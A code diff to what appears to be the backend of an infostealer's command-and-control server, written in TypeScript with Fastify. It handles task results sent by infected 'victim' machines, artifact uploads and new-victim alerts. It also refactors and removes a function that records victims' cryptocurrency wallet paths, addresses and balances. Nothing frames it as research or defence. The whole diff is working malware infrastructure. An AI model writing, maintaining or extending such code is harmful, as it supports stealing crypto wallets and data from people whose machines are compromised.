@@ -8,6 +8,7 @@ import { geo } from '../lib/geo';
 import { publish } from '../lib/bus';
 import { notifyVictimNew } from '../services/notify';
 import { commitUpload, initUpload, writeChunk } from '../services/artifact';
+import { applyTaskResult } from '../lib/task-result';
 
 const enrollSchema = z.object({
   build_token: z.string().min(8).max(128),
@@ -175,27 +176,13 @@ export const agentRoutes: FastifyPluginAsync = async (app) => {
     };
   });
 
-  app.post('/tasks/:id/result', authed, async (request, reply) => {
+  app.post('/tasks/:id/result', { ...authed, bodyLimit: 4 * 1024 * 1024 }, async (request, reply) => {
     const victim = request.victim!;
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
     const input = resultSchema.parse(request.body);
-    const task = await prisma.task.findFirst({ where: { id, victimId: victim.id } });
-    if (!task) throw notFound('task');
-    if ((task.status === 'done' || task.status === 'error' || task.status === 'cancelled') && task.result) {
-      return reply.code(409).send({ error: 'already_finished', message: 'result already stored' });
-    }
-    await prisma.task.update({
-      where: { id },
-      data: {
-        status: input.status === 'ok' ? 'done' : input.status === 'error' ? 'error' : 'cancelled',
-        error: input.error ?? null,
-        result: input.result as never,
-        finishedAt: new Date(),
-        leaseUntil: null
-      }
-    });
-    if (input.status === 'ok') await absorbWallets(victim.id, input.result);
-    void publish({ type: 'task.update', victimId: victim.id, at: Date.now(), data: { id, status: input.status } });
+    const outcome = await applyTaskResult(victim.id, id, input);
+    if (outcome === 'missing') throw notFound('task');
+    if (outcome === 'conflict') return reply.code(409).send({ error: 'already_finished', message: 'result already stored' });
     return { ok: true };
   });
 
@@ -249,32 +236,3 @@ export const agentRoutes: FastifyPluginAsync = async (app) => {
   });
 };
 
-async function absorbWallets(victimId: string, result: Record<string, unknown>): Promise<void> {
-  const wallets = Array.isArray(result.wallets) ? result.wallets : [];
-  for (const item of wallets.slice(0, 500)) {
-    if (!item || typeof item !== 'object') continue;
-    const wallet = item as Record<string, unknown>;
-    if (typeof wallet.path !== 'string' || typeof wallet.id !== 'string') continue;
-    await prisma.wallet.upsert({
-      where: { victimId_path: { victimId, path: wallet.path } },
-      update: {
-        kind: String(wallet.kind ?? 'extension'),
-        targetId: wallet.id,
-        state: String(wallet.state ?? 'found') as never,
-        reason: wallet.reason ? String(wallet.reason) : null,
-        address: wallet.address ? String(wallet.address) : null,
-        balance: wallet.balance ? String(wallet.balance) : null
-      },
-      create: {
-        victimId,
-        kind: String(wallet.kind ?? 'extension'),
-        targetId: wallet.id,
-        path: wallet.path,
-        state: String(wallet.state ?? 'found') as never,
-        reason: wallet.reason ? String(wallet.reason) : null,
-        address: wallet.address ? String(wallet.address) : null,
-        balance: wallet.balance ? String(wallet.balance) : null
-      }
-    });
-  }
-}
